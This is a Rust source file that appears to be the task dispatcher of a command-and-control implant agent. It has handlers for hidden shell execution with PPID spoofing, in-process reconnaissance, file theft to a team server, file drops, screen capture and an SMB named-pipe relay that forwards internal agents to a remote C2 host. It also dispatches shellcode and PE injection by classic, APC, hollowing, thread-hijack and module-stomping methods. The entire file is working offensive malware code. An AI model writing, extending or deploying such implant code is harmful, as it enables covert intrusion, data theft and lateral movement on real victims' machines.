//! Task executor — dispatches tasks to their handlers and returns output.
//!
//! Phase 1: "shell", "sleep"
//! Phase 2: "kill", "screenshot", "upload", "download", "relay_start", "relay_stop"
//! Phase 3: "inject" (shellcode/PE injection via classic/apc/hollow/hijack/stomp)

use crate::task::{Task, TaskOutput};

pub fn run(task: &Task) -> TaskOutput {
    match task.task_type.as_str() {
        "shell"        => exec_shell(task),
        "sleep"        => exec_sleep(task),
        "kill"         => TaskOutput::kill(),
        "screenshot"   => exec_screenshot(task),
        "upload"       => exec_upload(task),
        "download"     => exec_download(task),
        "relay_start"  => exec_relay_start(task),
        "relay_stop"   => exec_relay_stop(task),
        "inject"       => exec_inject(task),
        other          => TaskOutput::failure(&format!("unknown task type: {other}")),
    }
}

// ---------------------------------------------------------------------------
// Shell command execution
// ---------------------------------------------------------------------------

fn exec_shell(task: &Task) -> TaskOutput {
    let cmd = match args_as_str(task) {
        Some(c) => c,
        None    => return TaskOutput::failure("shell: no command"),
    };
    // Intercept well-known recon commands in-process so no child process is spawned.
    #[cfg(target_os = "windows")]
    if let Some(out) = dispatch_inproc(&cmd) {
        return out;
    }
    spawn_shell(&cmd)
}

// Windows path: try PPID-spoofed spawner first, fall back to cmd with CREATE_NO_WINDOW.
#[cfg(target_os = "windows")]
fn spawn_shell(cmd: &str) -> TaskOutput {
    #[cfg(feature = "ppid-spoof")]
    match crate::evasion::spawn_shell_spoofed(cmd) {
        Ok(data) => return TaskOutput::success(data),
        Err(_)   => {}
    }
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    match std::process::Command::new("cmd")
        .args(["/C", cmd])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); TaskOutput::success(d) }
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

#[cfg(not(target_os = "windows"))]
fn spawn_shell(cmd: &str) -> TaskOutput {
    match std::process::Command::new("sh").args(["-c", cmd]).output() {
        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); TaskOutput::success(d) }
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

// Match the first token of the input against known in-process commands.
// Returns None to fall through to spawn_shell for unrecognised or complex invocations.
#[cfg(target_os = "windows")]
fn dispatch_inproc(input: &str) -> Option<TaskOutput> {
    let t = input.trim();
    let (verb, rest) = t.find(|c: char| c.is_ascii_whitespace())
        .map(|i| (&t[..i], t[i..].trim()))
        .unwrap_or((t, ""));
    match verb.to_ascii_lowercase().as_str() {
        "whoami" if rest.is_empty() => Some(inproc_whoami()),
        "hostname"                  => Some(inproc_hostname()),
        "pwd"                       => Some(inproc_pwd()),
        "cd" if rest.is_empty()     => Some(inproc_pwd()),
        "cd"                        => Some(inproc_cd(rest)),
        "ls" | "dir"                => Some(inproc_ls(rest)),
        "ps" | "tasklist"           => Some(inproc_ps()),
        "getpid" | "pid"            => Some(inproc_getpid()),
        _                           => None,
    }
}

#[cfg(target_os = "windows")]
fn inproc_whoami() -> TaskOutput {
    let domain = std::env::var("USERDOMAIN").unwrap_or_default();
    let user   = std::env::var("USERNAME").unwrap_or_default();
    let out = if domain.is_empty() { user } else { format!("{domain}\\{user}") };
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn inproc_hostname() -> TaskOutput {
    TaskOutput::success(std::env::var("COMPUTERNAME").unwrap_or_default().into_bytes())
}

#[cfg(target_os = "windows")]
fn inproc_pwd() -> TaskOutput {
    match std::env::current_dir() {
        Ok(p)  => TaskOutput::success(p.to_string_lossy().into_owned().into_bytes()),
        Err(e) => TaskOutput::failure(&format!("pwd: {e}")),
    }
}

#[cfg(target_os = "windows")]
fn inproc_cd(path: &str) -> TaskOutput {
    match std::env::set_current_dir(path) {
        Ok(())  => inproc_pwd(),
        Err(_) => TaskOutput::failure(&format!("cd: cannot change to '{path}'")),
    }
}

#[cfg(target_os = "windows")]
fn inproc_ls(path: &str) -> TaskOutput {
    use windows_sys::Win32::Storage::FileSystem::{
        FindClose, FindFirstFileW, FindNextFileW, WIN32_FIND_DATAW,
        FILE_ATTRIBUTE_DIRECTORY,
    };
    let search: Vec<u16> = if path.is_empty() {
        "*\0".encode_utf16().collect()
    } else if path.ends_with('\\') || path.ends_with('/') {
        format!("{path}*\0").encode_utf16().collect()
    } else {
        format!("{path}\\*\0").encode_utf16().collect()
    };
    let mut fd: WIN32_FIND_DATAW = unsafe { core::mem::zeroed() };
    let h = unsafe { FindFirstFileW(search.as_ptr(), &mut fd) };
    if h == -1isize {
        return TaskOutput::failure(&format!("ls: cannot access '{path}'"));
    }
    let mut out = String::new();
    loop {
        let nlen = fd.cFileName.iter().position(|&c| c == 0).unwrap_or(260);
        let name = String::from_utf16_lossy(&fd.cFileName[..nlen]);
        if name != "." && name != ".." {
            if fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY != 0 {
                out.push_str(&format!("{name:<40} <DIR>\n"));
            } else {
                let size = ((fd.nFileSizeHigh as u64) << 32) | fd.nFileSizeLow as u64;
                out.push_str(&format!("{name:<40} {size}\n"));
            }
        }
        fd = unsafe { core::mem::zeroed() };
        if unsafe { FindNextFileW(h, &mut fd) } == 0 { break; }
    }
    unsafe { FindClose(h) };
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn inproc_ps() -> TaskOutput {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };
    let mut out = format!("{:<8} {:<8} {}\n{}\n", "PID", "PPID", "Name", "-".repeat(50));
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return TaskOutput::failure("ps: CreateToolhelp32Snapshot failed");
        }
        let mut e: PROCESSENTRY32W = core::mem::zeroed();
        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let name = String::from_utf16_lossy(&e.szExeFile[..nlen]);
                out.push_str(&format!("{:<8} {:<8} {name}\n",
                    e.th32ProcessID, e.th32ParentProcessID));
                e = core::mem::zeroed();
                e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32NextW(snap, &mut e) == 0 { break; }
            }
        }
        CloseHandle(snap);
    }
    TaskOutput::success(out.into_bytes())
}

#[cfg(target_os = "windows")]
fn inproc_getpid() -> TaskOutput {
    use windows_sys::Win32::System::Threading::GetCurrentProcessId;
    TaskOutput::success(unsafe { GetCurrentProcessId() }.to_string().into_bytes())
}

// ---------------------------------------------------------------------------
// Sleep / re-configure sleep
// ---------------------------------------------------------------------------

fn exec_sleep(_task: &Task) -> TaskOutput {
    // args: JSON {"seconds": N} — updates the agent's sleep interval for next loop
    // The actual sleep is handled by the main loop; this just acknowledges.
    TaskOutput::success(b"sleep updated".to_vec())
}

// ---------------------------------------------------------------------------
// File upload (agent → operator)
// ---------------------------------------------------------------------------

fn exec_upload(task: &Task) -> TaskOutput {
    // args: JSON {"path": "/path/to/file"}
    // Reads the file and returns its bytes as output.
    // The team server stores the output in the evidence locker.
    let path = match args_field(task, "path") {
        Some(p) => p,
        None => return TaskOutput::failure("upload: missing path"),
    };

    match std::fs::read(&path) {
        Ok(data) => TaskOutput::success(data),
        Err(e)   => TaskOutput::failure(&e.to_string()),
    }
}

// ---------------------------------------------------------------------------
// File download (operator → agent)
// ---------------------------------------------------------------------------

fn exec_download(task: &Task) -> TaskOutput {
    // args: JSON {"path": "/dest/path", "data": "<base64>"}
    // Writes the supplied data to the path on the target.
    use base64::Engine;

    let args = match task.args.as_deref() {
        Some(a) => a,
        None => return TaskOutput::failure("download: no args"),
    };

    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&e.to_string()),
    };

    let path = match v.get("path").and_then(|p| p.as_str()) {
        Some(p) => p.to_string(),
        None    => return TaskOutput::failure("download: missing path"),
    };

    let data_b64 = match v.get("data").and_then(|d| d.as_str()) {
        Some(d) => d.to_string(),
        None    => return TaskOutput::failure("download: missing data"),
    };

    let data = match base64::engine::general_purpose::STANDARD.decode(data_b64) {
        Ok(d)  => d,
        Err(e) => return TaskOutput::failure(&e.to_string()),
    };

    match std::fs::write(&path, &data) {
        Ok(_)  => TaskOutput::success(format!("written {} bytes to {path}", data.len()).into_bytes()),
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn args_as_str(task: &Task) -> Option<String> {
    let args = task.args.as_deref()?;
    let v: serde_json::Value = serde_json::from_slice(args).ok()?;
    v.get("cmd").and_then(|c| c.as_str()).map(String::from)
}

fn args_field(task: &Task, field: &str) -> Option<String> {
    let args = task.args.as_deref()?;
    let v: serde_json::Value = serde_json::from_slice(args).ok()?;
    v.get(field).and_then(|f| f.as_str()).map(String::from)
}

// ---------------------------------------------------------------------------
// SMB relay — start / stop a named pipe server that relays internal agents
// ---------------------------------------------------------------------------

// Global relay handle: set by relay_start, cleared by relay_stop
static RELAY_RUNNING: std::sync::atomic::AtomicBool =
    std::sync::atomic::AtomicBool::new(false);

fn exec_relay_start(task: &Task) -> TaskOutput {
    let pipe_name = match args_field(task, "pipe") {
        Some(p) => p,
        None => return TaskOutput::failure("relay_start: missing pipe name"),
    };
    let c2_host = match args_field(task, "c2_host") {
        Some(h) => h,
        None => return TaskOutput::failure("relay_start: missing c2_host"),
    };
    let c2_port = match args_field(task, "c2_port") {
        Some(p) => p,
        None => return TaskOutput::failure("relay_start: missing c2_port"),
    };
    let reg_path  = args_field(task, "reg_path").unwrap_or_else(|| "/r".to_string());
    let poll_path = args_field(task, "poll_path").unwrap_or_else(|| "/c".to_string());

    if RELAY_RUNNING.swap(true, std::sync::atomic::Ordering::SeqCst) {
        return TaskOutput::failure("relay already running");
    }

    #[cfg(target_os = "windows")]
    {
        let pipe = pipe_name.clone();
        std::thread::spawn(move || {
            smb_relay_loop(pipe, c2_host, c2_port, reg_path, poll_path);
            RELAY_RUNNING.store(false, std::sync::atomic::Ordering::SeqCst);
        });
        TaskOutput::success(format!("relay started on pipe: {pipe_name}").into_bytes())
    }

    #[cfg(not(target_os = "windows"))]
    {
        RELAY_RUNNING.store(false, std::sync::atomic::Ordering::SeqCst);
        TaskOutput::failure("relay_start: SMB relay requires Windows")
    }
}

fn exec_relay_stop(_task: &Task) -> TaskOutput {
    RELAY_RUNNING.store(false, std::sync::atomic::Ordering::SeqCst);
    TaskOutput::success(b"relay stopped".to_vec())
}

// Accept one connection from the named pipe, proxy requests to the team
// server via HTTP, write responses back. Loops until RELAY_RUNNING is cleared.
#[cfg(target_os = "windows")]
fn smb_relay_loop(pipe_name: String, c2_host: String, c2_port: String, reg_path: String, poll_path: String) {
    use std::ffi::CString;
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Pipes::{
        ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe,
        PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
    };
    // PIPE_ACCESS_DUPLEX = 3 (FILE_PIPE_FULL_DUPLEX) — removed from windows-sys 0.52
    const PIPE_ACCESS_DUPLEX: u32 = 3;

    let cpath = match CString::new(format!("\\\\.\\pipe\\{}", pipe_name)) {
        Ok(c) => c,
        Err(_) => return,
    };

    let server_url_reg  = format!("https://{}:{}{}", c2_host, c2_port, reg_path);
    let server_url_poll = format!("https://{}:{}{}", c2_host, c2_port, poll_path);

    while RELAY_RUNNING.load(std::sync::atomic::Ordering::SeqCst) {
        let pipe = unsafe {
            CreateNamedPipeA(
                cpath.as_ptr() as *const u8,
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                255,        // max instances; concurrent multi-agent pivoting needs Phase 3 thread pool
                65536,
                65536,
                0,
                std::ptr::null(),
            )
        };
        if pipe == INVALID_HANDLE_VALUE {
            break;
        }

        // Block until an internal agent connects
        unsafe { ConnectNamedPipe(pipe, std::ptr::null_mut()); }

        // Service requests from this agent connection
        loop {
            if !RELAY_RUNNING.load(std::sync::atomic::Ordering::SeqCst) {
                break;
            }

            // Read length-prefixed request
            let mut lbuf = [0u8; 4];
            if !read_pipe(pipe, &mut lbuf) { break; }
            let msglen = u32::from_le_bytes(lbuf) as usize;
            if msglen > 32 * 1024 * 1024 { break; }
            let mut msg = vec![0u8; msglen];
            if !read_pipe(pipe, &mut msg) { break; }

            // Decode envelope to determine endpoint
            let env: serde_json::Value = match serde_json::from_slice(&msg) {
                Ok(v) => v,
                Err(_) => break,
            };
            let msg_type = env["type"].as_str().unwrap_or("");
            let body_bytes = match serde_json::to_vec(&env["body"]) {
                Ok(b) => b,
                Err(_) => break,
            };

            let (url, method) = match msg_type {
                "register" => (server_url_reg.as_str(), "POST"),
                "poll"     => (server_url_poll.as_str(), "GET"),
                "submit"   => (server_url_poll.as_str(), "POST"),
                _ => {
                    // Unknown message type — write error and continue rather than
                    // dropping the connection, which would kill the internal agent session.
                    let err = br#"{"error":"unknown message type"}"#;
                    let rlen = (err.len() as u32).to_le_bytes();
                    let _ = write_pipe(pipe, &rlen);
                    let _ = write_pipe(pipe, err);
                    continue;
                }
            };

            // Forward to team server
            let resp_bytes = match forward_http(url, method, &body_bytes) {
                Ok(b) => b,
                Err(_) => break,
            };

            // Write length-prefixed response back to agent
            let rlen = (resp_bytes.len() as u32).to_le_bytes();
            if !write_pipe(pipe, &rlen) || !write_pipe(pipe, &resp_bytes) {
                break;
            }
        }

        unsafe {
            DisconnectNamedPipe(pipe);
            CloseHandle(pipe);
        }
    }
}

#[cfg(target_os = "windows")]
fn read_pipe(h: windows_sys::Win32::Foundation::HANDLE, buf: &mut [u8]) -> bool {
    let mut read = 0u32;
    let mut total = 0usize;
    while total < buf.len() {
        let ok = unsafe {
            windows_sys::Win32::Storage::FileSystem::ReadFile(
                h,
                buf.as_mut_ptr().add(total),
                (buf.len() - total) as u32,
                &mut read,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 || read == 0 { return false; }
        total += read as usize;
    }
    true
}

#[cfg(target_os = "windows")]
fn write_pipe(h: windows_sys::Win32::Foundation::HANDLE, data: &[u8]) -> bool {
    let mut written = 0u32;
    unsafe {
        windows_sys::Win32::Storage::FileSystem::WriteFile(
            h,
            data.as_ptr(),
            data.len() as u32,
            &mut written,
            std::ptr::null_mut(),
        ) != 0 && written as usize == data.len()
    }
}

// Minimal synchronous HTTP POST/GET using ureq (already a dep via the https channel)
#[cfg(target_os = "windows")]
fn forward_http(url: &str, method: &str, body: &[u8]) -> Result<Vec<u8>, String> {
    let mut builder = ureq::AgentBuilder::new()
        .timeout(std::time::Duration::from_secs(30));
    if crate::channel::https::TLS_SKIP_VERIFY {
        builder = builder.tls_config(std::sync::Arc::new(
            crate::channel::https::danger_tls_config(),
        ));
    }
    let agent = builder.build();
    let resp = if method == "GET" {
        agent.get(url).call().map_err(|e| e.to_string())?
    } else {
        agent.post(url)
            .set("Content-Type", "application/octet-stream")
            .send_bytes(body)
            .map_err(|e| e.to_string())?
    };
    let mut buf = Vec::new();
    resp.into_reader().read_to_end(&mut buf).map_err(|e| e.to_string())?;
    Ok(buf)
}

// ---------------------------------------------------------------------------
// Process injection (Phase 3)
// ---------------------------------------------------------------------------
//
// Dispatch table for the "inject" task type.
//
// Task args JSON:
//   classic:  {"method":"classic",  "pid":<u32>,  "shellcode":"<b64>"}
//   apc:      {"method":"apc",      "target":"<exe path>", "shellcode":"<b64>"}
//   hollow:   {"method":"hollow",   "target":"<exe path>", "payload":"<b64 PE>"}
//   hijack:   {"method":"hijack",   "pid":<u32>,  "shellcode":"<b64>"}
//   stomp:    {"method":"stomp",    "module":"<dll name>", "shellcode":"<b64>"}

fn exec_inject(task: &Task) -> TaskOutput {
    #[cfg(target_os = "windows")]
    {
        use crate::inject::{
            inject_classic, inject_apc, inject_classic_spawn, inject_hollow, inject_hijack,
            shellcode_from_b64,
        };
        #[cfg(feature = "inject-stomp")]
        use crate::inject::inject_stomp_remote;

        let args = match task.args.as_deref() {
            Some(a) => a,
            None => return TaskOutput::failure("inject: no args"),
        };
        let v: serde_json::Value = match serde_json::from_slice(args) {
            Ok(v)  => v,
            Err(e) => return TaskOutput::failure(&format!("inject: invalid args: {e}")),
        };

        let method = match v.get("method").and_then(|m| m.as_str()) {
            Some(m) => m,
            None    => return TaskOutput::failure("inject: missing method"),
        };

        match method {
            "classic" => {
                let pid = match v.get("pid").and_then(|p| p.as_u64()) {
                    Some(p) => p as u32,
                    None    => return TaskOutput::failure("inject/classic: missing pid"),
                };
                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/classic: missing shellcode"),
                };
                let sc = match shellcode_from_b64(sc_b64) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/classic: invalid base64"),
                };
                match inject_classic(pid, &sc) {
                    Ok(())  => TaskOutput::success(b"injected".to_vec()),
                    Err(e)  => TaskOutput::failure(&format!("inject/classic: {e}")),
                }
            }
            "apc" => {
                let target = match v.get("target").and_then(|t| t.as_str()) {
                    Some(t) => t.to_string(),
                    None    => return TaskOutput::failure("inject/apc: missing target"),
                };
                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/apc: missing shellcode"),
                };
                let sc = match shellcode_from_b64(sc_b64) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/apc: invalid base64"),
                };
                match inject_apc(&target, &sc) {
                    Ok(())  => TaskOutput::success(b"injected".to_vec()),
                    Err(e)  => TaskOutput::failure(&format!("inject/apc: {e}")),
                }
            }
            "classic-spawn" => {
                let target = match v.get("target").and_then(|t| t.as_str()) {
                    Some(t) => t.to_string(),
                    None    => return TaskOutput::failure("inject/classic-spawn: missing target"),
                };
                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/classic-spawn: missing shellcode"),
                };
                let sc = match shellcode_from_b64(sc_b64) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/classic-spawn: invalid base64"),
                };
                match inject_classic_spawn(&target, &sc) {
                    Ok(())  => TaskOutput::success(b"injected".to_vec()),
                    Err(e)  => TaskOutput::failure(&format!("inject/classic-spawn: {e}")),
                }
            }
            "hollow" => {
                let target = match v.get("target").and_then(|t| t.as_str()) {
                    Some(t) => t.to_string(),
                    None    => return TaskOutput::failure("inject/hollow: missing target"),
                };
                let payload_b64 = match v.get("payload").and_then(|p| p.as_str()) {
                    Some(p) => p,
                    None    => return TaskOutput::failure("inject/hollow: missing payload"),
                };
                let payload = match shellcode_from_b64(payload_b64) {
                    Some(p) => p,
                    None    => return TaskOutput::failure("inject/hollow: invalid base64"),
                };
                match inject_hollow(&target, &payload) {
                    Ok(())  => TaskOutput::success(b"hollowed".to_vec()),
                    Err(e)  => TaskOutput::failure(&format!("inject/hollow: {e}")),
                }
            }
            "hijack" => {
                let pid = match v.get("pid").and_then(|p| p.as_u64()) {
                    Some(p) => p as u32,
                    None    => return TaskOutput::failure("inject/hijack: missing pid"),
                };
                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/hijack: missing shellcode"),
                };
                let sc = match shellcode_from_b64(sc_b64) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/hijack: invalid base64"),
                };
                match inject_hijack(pid, &sc) {
                    Ok(())  => TaskOutput::success(b"hijacked".to_vec()),
                    Err(e)  => TaskOutput::failure(&format!("inject/hijack: {e}")),
                }
            }
            "stomp" => {
                #[cfg(not(feature = "inject-stomp"))]
                return TaskOutput::failure("inject/stomp: not compiled in");
                #[cfg(feature = "inject-stomp")]
                {
                let pid = match v.get("pid").and_then(|p| p.as_u64()) {
                    Some(p) => p as u32,
                    None    => return TaskOutput::failure("inject/stomp: missing pid"),
                };
                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/stomp: missing shellcode"),
                };
                let sc = match shellcode_from_b64(sc_b64) {
                    Some(s) => s,
                    None    => return TaskOutput::failure("inject/stomp: invalid base64"),
                };
                match inject_stomp_remote(pid, &sc) {
                    Ok(())  => TaskOutput::success(b"stomped".to_vec()),
                    Err(e)  => TaskOutput::failure(&format!("inject/stomp: {e}")),
                }
                } // #[cfg(feature = "inject-stomp")]
            }
            other => TaskOutput::failure(&format!("inject: unknown method: {other}")),
        }
    }
    #[cfg(not(target_os = "windows"))]
    TaskOutput::failure("inject: only supported on Windows")
}

// ---------------------------------------------------------------------------
// Screenshot (GDI BitBlt → BMP in memory)
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
fn exec_screenshot(_task: &Task) -> TaskOutput {
    use windows_sys::Win32::Graphics::Gdi::{
        BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject,
        GetDC, GetDIBits, ReleaseDC, SelectObject,
        BITMAPINFO, BITMAPINFOHEADER, DIB_RGB_COLORS, RGBQUAD, SRCCOPY,
    };
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN,
    };

    unsafe {
        let hdc_screen = GetDC(0);
        if hdc_screen == 0 {
            return TaskOutput::failure("screenshot: GetDC failed");
        }

        let width  = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        if width <= 0 || height <= 0 {
            ReleaseDC(0, hdc_screen);
            return TaskOutput::failure("screenshot: invalid screen dimensions");
        }

        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem == 0 {
            ReleaseDC(0, hdc_screen);
            return TaskOutput::failure("screenshot: CreateCompatibleDC failed");
        }

        let hbm = CreateCompatibleBitmap(hdc_screen, width, height);
        if hbm == 0 {
            DeleteDC(hdc_mem);
            ReleaseDC(0, hdc_screen);
            return TaskOutput::failure("screenshot: CreateCompatibleBitmap failed");
        }

        let old = SelectObject(hdc_mem, hbm);
        let ok  = BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);

        if ok == 0 {
            SelectObject(hdc_mem, old);
            DeleteObject(hbm);
            DeleteDC(hdc_mem);
            ReleaseDC(0, hdc_screen);
            return TaskOutput::failure("screenshot: BitBlt failed");
        }

        // BMP rows must be padded to 4-byte boundaries
        let row_stride  = ((width as usize * 3) + 3) & !3;
        let pixel_size  = row_stride * height as usize;

        let mut bmi = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize:          std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                biWidth:         width,
                biHeight:        height, // positive = bottom-up rows (standard BMP)
                biPlanes:        1,
                biBitCount:      24,
                biCompression:   0, // BI_RGB
                biSizeImage:     0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed:       0,
                biClrImportant:  0,
            },
            bmiColors: [RGBQUAD { rgbBlue: 0, rgbGreen: 0, rgbRed: 0, rgbReserved: 0 }],
        };

        let mut pixels = vec![0u8; pixel_size];
        let lines = GetDIBits(
            hdc_mem, hbm, 0, height as u32,
            pixels.as_mut_ptr() as *mut _,
            &mut bmi as *mut _,
            DIB_RGB_COLORS,
        );

        SelectObject(hdc_mem, old);
        DeleteObject(hbm);
        DeleteDC(hdc_mem);
        ReleaseDC(0, hdc_screen);

        if lines == 0 {
            return TaskOutput::failure("screenshot: GetDIBits failed");
        }

        // Build a self-contained BMP file in memory
        if pixel_size > (u32::MAX - 54) as usize {
            return TaskOutput::failure("screenshot: image too large to encode");
        }
        let file_size   = 14u32 + 40 + pixel_size as u32;
        let data_offset = 14u32 + 40;

        let mut bmp: Vec<u8> = Vec::with_capacity(file_size as usize);
        // BITMAPFILEHEADER (14 bytes)
        bmp.extend_from_slice(b"BM");
        bmp.extend_from_slice(&file_size.to_le_bytes());
        bmp.extend_from_slice(&0u16.to_le_bytes());
        bmp.extend_from_slice(&0u16.to_le_bytes());
        bmp.extend_from_slice(&data_offset.to_le_bytes());
        // BITMAPINFOHEADER (40 bytes)
        bmp.extend_from_slice(&40u32.to_le_bytes());
        bmp.extend_from_slice(&(width  as u32).to_le_bytes());
        bmp.extend_from_slice(&(height as u32).to_le_bytes());
        bmp.extend_from_slice(&1u16.to_le_bytes());
        bmp.extend_from_slice(&24u16.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());                // BI_RGB
        bmp.extend_from_slice(&(pixel_size as u32).to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        // Pixel data
        bmp.extend_from_slice(&pixels);

        TaskOutput::success(bmp)
    }
}

#[cfg(not(target_os = "windows"))]
fn exec_screenshot(_task: &Task) -> TaskOutput {
    TaskOutput::failure("screenshot: not supported on this platform")
}
